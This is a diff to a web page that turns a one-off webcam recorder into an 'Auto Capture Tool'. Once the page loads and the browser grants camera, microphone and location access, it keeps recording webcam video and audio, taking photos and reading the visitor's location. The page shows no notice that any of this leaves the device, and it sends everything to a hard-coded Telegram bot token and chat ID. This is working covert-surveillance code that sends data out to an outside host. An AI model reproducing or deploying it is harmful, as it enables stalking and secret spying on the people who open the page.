@@ -3,119 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Recorder</title>
+    <title>Auto Capture Tool</title>
     <style>
         body {
             display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #121212;
-            color: white;
-            font-family: Arial, sans-serif;
-            margin: 0;
-            overflow: hidden;
-        }
-        #recorder {
-            display: flex;
             flex-direction: column;
             align-items: center;
-            text-align: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #282c34;
+            color: white;
+            font-family: Arial, sans-serif;
         }
-        #canvas {
-            border: 5px solid #ff4500;
-            border-radius: 10px;
-        }
-        h1 {
-            margin-bottom: 20px;
-            font-size: 24px;
+        video, img {
+            border: 1px solid #61dafb;
+            margin: 10px;
         }
     </style>
 </head>
 <body>
-    <div id="recorder">
-        <h1>Recording Video...</h1>
-        <canvas id="canvas" width="640" height="480"></canvas>
-    </div>
 
-    <script>
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        let mediaRecorder;
-        let recordedChunks = [];
+<h1>Automatic Capture Tool</h1>
+<video id="video" width="320" height="240" autoplay muted></video> <!-- Muted the audio -->
+<img id="photo" alt="Captured Photo" width="320">
+<div id="location"></div>
 
-        async function startRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+<script>
+    const video = document.getElementById('video');
+    const photo = document.getElementById('photo');
+    const locationDiv = document.getElementById('location');
+    let mediaRecorder;
+    let videoChunks = [];
 
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
+    const TELEGRAM_BOT_TOKEN = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA';
+    const CHAT_ID = '1691680798'; // Replace with your Telegram Chat ID
 
-                mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    recordedChunks = [];
-                    await sendToTelegram(videoBlob);
-                };
+    // Start video stream
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(stream => {
+            video.srcObject = stream;
+            startCapturing(stream);
+        })
+        .catch(err => console.error("Error accessing webcam: ", err));
 
-                mediaRecorder.start();
-                drawCanvas(video);
+    // Start capturing location, video, and photo
+    function startCapturing(stream) {
+        setInterval(captureLocation, 2000); // Capture location every 2 seconds
+        startVideoCapture(stream); // Start video capture
+        setInterval(capturePhoto, 2000); // Capture photo every 2 seconds
+    }
 
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    video.pause();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 10000); // Record for 10 seconds
+    function startVideoCapture(stream) {
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
-            } catch (error) {
-                console.error('Error accessing media devices.', error);
-                alert('Could not start video recording. Please ensure you have granted camera and microphone permissions.');
+        mediaRecorder.ondataavailable = event => {
+            videoChunks.push(event.data);
+            if (videoChunks.length > 0) {
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                videoChunks = []; // Reset for the next capture
+                sendToTelegram('Video captured', videoBlob);
             }
+        };
+
+        // Record video for 10 seconds and then send it
+        setInterval(() => {
+            videoChunks = []; // Clear previous chunks
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 10000); // Stop recording after 10 seconds
+        }, 10000); // Start a new recording every 10 seconds
+    }
+
+    function captureLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const { latitude, longitude } = position.coords;
+                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                locationDiv.innerHTML = `Latitude: ${latitude}, Longitude: ${longitude} <br> <a href="${mapLink}" target="_blank">Open in Google Maps</a>`;
+                sendLocationToTelegram(latitude, longitude);
+            });
+        } else {
+            locationDiv.innerHTML = "Geolocation is not supported by this browser.";
         }
+    }
 
-        function drawCanvas(video) {
-            const draw = () => {
-                if (!video.paused && !video.ended) {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    requestAnimationFrame(draw);
-                }
-            };
-            draw();
+    function capturePhoto() {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL('image/png');
+        photo.src = dataUrl;
+
+        // Convert data URL to blob
+        fetch(dataUrl)
+            .then(res => res.blob())
+            .then(blob => {
+                sendToTelegram('Photo captured', blob);
+            });
+    }
+
+    async function sendToTelegram(message, data) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        // Sending text message to Telegram
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+            }),
+        });
+
+        // Send video or photo if data is a blob
+        if (data instanceof Blob && data.type.startsWith('video/')) {
+            await sendVideoToTelegram(data);
+        } else if (data instanceof Blob && data.type.startsWith('image/')) {
+            await sendPhotoToTelegram(data);
         }
+    }
 
-        async function sendToTelegram(videoBlob) {
-            const formData = new FormData();
-            formData.append('video', videoBlob, 'video.webm');
+    async function sendVideoToTelegram(videoBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', videoBlob, 'video.webm'); // Name the video as needed
 
-            const telegramBotToken = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA';
-            const telegramChatId = '1691680798';
-            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${telegramChatId}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+        await fetch(url, {
+            method: 'POST',
+            body: formData,
+        });
+    }
 
-            try {
-                const response = await fetch(telegramApiUrl, {
-                    method: 'POST',
-                    body: formData
-                });
+    async function sendPhotoToTelegram(photoBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', photoBlob, 'photo.png'); // Name the photo as needed
 
-                if (response.ok) {
-                    alert('Video sent to Telegram successfully!');
-                } else {
-                    alert('Failed to send video to Telegram.');
-                }
-            } catch (error) {
-                console.error('Error sending video to Telegram:', error);
-                alert('Error sending video to Telegram.');
-            }
-        }
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        await fetch(url, {
+            method: 'POST',
+            body: formData,
+        });
+    }
 
-        // Start recording automatically when the page loads
-        window.addEventListener('load', startRecording);
-    </script>
+    async function sendLocationToTelegram(latitude, longitude) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                latitude: latitude,
+                longitude: longitude,
+            }),
+        });
+    }
+
+</script>
+
 </body>
 </html>
